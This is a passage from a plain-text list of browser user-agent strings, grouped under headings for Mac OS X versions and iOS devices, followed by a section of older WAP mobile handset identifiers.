		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.363.0 Safari/533.3 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.414.0 Safari/534.1 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.451.0 Safari/534.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.461.0 Safari/534.3 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.458.1 Safari/534.3 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; fr-FR) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.126 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.0 Safari/534.16 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.655.0 Safari/534.17 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.210 Safari/534.10 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.639.0 Safari/534.16 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.698.0 Safari/534.24 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.660.0 Safari/534.18 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27 
		Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.71 Safari/534.24 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.68 Safari/534.30 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.11 Safari/535.19 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.24 (KHTML, like Gecko) Iron/11.0.700.2 Chrome/11.0.700.2 Safari/534.24 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.1 (KHTML, like Gecko) RockMelt/0.9.64.361 Chrome/13.0.782.218 Safari/535.1 
		iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)

		Mac OS X 10_7*: 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.0 Safari/534.24 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.342.7 Safari/533.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.106 Safari/535.2 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36

		Mac OS X 10_8*: 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3 
		Mozilla/5.0 (Macintosh; AMD Mac OS X 10_8_2) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/18.6.872 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.4 (KHTML like Gecko) Chrome/22.0.1229.79 Safari/537.4 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36

		Mac OS X 10_9*: 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36

		Mac OS X 10.*: 
		iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2) 
		Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2a1pre) Gecko/20090626 Fennec/1.0b2 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.1) Gecko/20110318 Firefox/4.0b13pre Fennec/4.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14 
		Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:16.0) Gecko/20120813 Firefox/16.0

		Mac OS X(others): 
		Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15 
		Opera/9.0 (Macintosh; PPC Mac OS X; U; en) 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941 
		Opera/9.20 (Macintosh; Intel Mac OS X; U; en) 
		Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1 
		Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61 
		Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5 
		Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25 
		Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10 
		Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5 
		Mozilla/5.0 (iPod; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/3A100a Safari/419.3 
		Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 
		Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405 
		Mozilla/5.0 (iPad; U; CPU OS 4_2 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C134 
		Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5 
		Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5 
		Mozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5 
		Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5 
		Mozilla/5.0 (iPad; U; CPU OS 4_3_4 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5 
		Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5 
		Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US; rv:0.9.4.1) Gecko/20020315 Netscape6/6.2.2 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-JP; rv:1.0.2) Gecko/20021120 Netscape/7.01 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; ja-JP; rv:1.4) Gecko/20030624 Netscape/7.1 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.6) Gecko/20040113 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.6) Gecko/20040206 Firefox/0.8 
		Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/3730; U; en) Presto/2.4.18 Version/10.00 
		Opera/9.80 (Macintosh; Intel Mac OS X; Opera Mobi/27; U; en) Presto/2.4.18 Version/10.00 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3 TeaShark/0.8 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4


		Wap:

		MOT-A668/ WAP.Browser/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V690/ WAP.Browser/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V872/ WAP.Browser/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-V878/ WAP.Browser/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		MOT-MPx220(2005.5.10)/SW1.390/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; 
		MOT-MPx220(2005.5.26)/SW3.460/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 Mozilla/4.0 (compatible; 
		Amoi-A650/Plat-V-FT/WAP2.0/MIDP2.0/CLDC1.0 UP.Browser/6.2.3.8.c.1.100 (GUI) MMP/2.0 
		Amoi-A660/Plat-V-FT/WAP2.0/MIDP2.0/CLDC1.0 UP.Browser/6.2.3.3 (GUI) MMP/2.0 
		Amoi-D80/Plat-F-FT/WAP2.0/MIDP1.0/CLDC1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Amoi-D85/Plat-F/WAP2.0/MIDP1.0/CLDC1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Amoi-D89/Plat-F/WAP2.0/MIDP1.0/CLDC1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Amoi-DF9/Plat-F/WAP2.0/MIDP1.0/CLDC1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Amoi-F6/Plat-F/WAP2.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Amoi-F8/Plat-F/WAP2.0/MIDP1.0/CLDC1.0 UP.Browser/6.2.2.7.c.1.101 (GUI) MMP/1.0 
		Amoi-M350/Plat-V-VIM/WAP2.0/MIDP2.0/CLDC1.0 UP.Browser/6.2.3.3 (GUI) MMP/2.0 
		Amoi-M6/Plat-EMP/WAP2.0/MIDP2.0/CLDC1.0 
		Amoi-M630/Plat-V-VIM/WAP2.0/MIDP2.0/CLDC1.0 UP.Browser/6.2.3.8.c.1.100 (GUI) MMP/2.0 
		Amoi-M66/Plat-EMP/WAP2.0/MIDP2.0/CLDC1.0 
		Amoi-M8/Plat-EMP/WAP2.0/MIDP2.0/CLDC1.0 
		BENQS660C/1.36/WAP2.0/MIDP1.0/CLDC1.0 UP.Browser/6.1.0.7.8.c.1.100 (GUI) MMP/1.0 
		BIRD D600/L05,1E/WAP2.0/MIDP-2.0/CLDC-1.1 
		Bird-X8/K23,PM/WAP2.0/MIDP-2.0/CLDC-1.0 UP.Browser/6.2.3.3.g.1 (GUI) MMP/2.0 
		Bird.M19/LO,901/WAP2.0/MIDP-2.0/CLDC-1.1 Browser/UP.Browser/7.1.0.f.1.144 (GUI) 
		Bird.S689/K03,MI/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.d.3.100 (GUI)
		Bird.S689/K03,MK/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.d.3.100 (GUI) 
		Bird.S689/K03,MM/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.d.3.100 (GUI) 
		Bird.S689/K03,MN/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.d.3.100 (GUI) 
		Bird.S689/K03,MP/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.2.6.d.3.100 (GUI) 
		Bird.S789+/KQ3,U01/WAP2.0/MIDP-2.0/CLDC-1.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Bird.S889/JL3,BV/WAP2.0 UP.Browser/6.2.2.5.d.3 (GUI) MMP/1.0 
		CK-PT01/(2005.08.24)Ver1.0.2/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		EASTCOM-ES1009/(2005.05.10)SW02/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		EG670/(2005.07.01)1.0/WAP2.0 Profile 
		ESATCOM-ES2100/(2005.9.13)SW3.00/WAP2.0 MIDP/MIDP2.0 CLDC/CLDC1.0 
		GN606/SW1.0.0/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0/Handset WAP 
		GN608/SW1.0.0/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0/Handset WAP 
		KONKA-D180WAP2.0 MIDP/MIDP2.0 CLDC/CLDC1.0 HTTP_COOKIE:$Version=0; 
		LENOVO-I950/(2005.05.17)Ver09/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		LENOVO-I950/(2005.06.15)S014/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		LENOVO-I950/(2005.07.18)S015/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		LENOVO-P902/(2005.03.28)Ver1.0.4/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		LG-B2050 MIC/WAP2.0 MIDP-2.0/CLDC-1.0 
		LG-G1800 MIC/WAP2.0 MIDP-2.0/CLDC-1.0 
		LG-G210/SW100/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		LG-G232/V100/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		LG-G252/V100/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		LG-G622/V100/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		LG-G660/V100/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		LG-G672/V100/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		LG-G688 MIC/V100/WAP2.0 MIDP-2.0/CLDC-1.0 
		LG-G822/SW100/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1 
		Mitsu-M760/(2005.05.20)95AH4221/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 MMP/1.1 
		NEC-N110/0730MAWC/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.1.0.7.8 (GUI)
		NEC-N150/(2004.12.1)SW3.0.0/WAP2.0 
		NEC-N158/(2004.12.30)SW4.0.0/WAP2.0 
		NEC-N6201/(2005.07.01)SW02.40/WAP2.0/MIDP1.0/CLDC1.1 
		NEC-N630/(2005.01.10)SW02.02/WAP2.0 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		NEC-N720/2004AJCC/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.3.2.g.1.106 (GUI) 
		NEC-N728/2004AJCC/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.3.2.g.1.106 (GUI) 
		NEC-N840/(2004.12.20)DJCC/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 UP.Browser/6.2.3.2.g.1.108 
		Panasonic-SC3/1.0(2005.06.16) SW0.34/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Panasonic-VS3/(2005.05.11)SW1.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Panasonic-X700/(2005.01.20) SW1.0.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Panasonic-X800/(2005.01.20) SW1.0.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		SAMSUNG-SGH-D508/1.0/WAP2.0 Profile/MIDP-2.0 
		SAMSUNG-SGH-D508/1.0/WAP2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1/*MzU1NTgxMDAwNjMyNjg3 
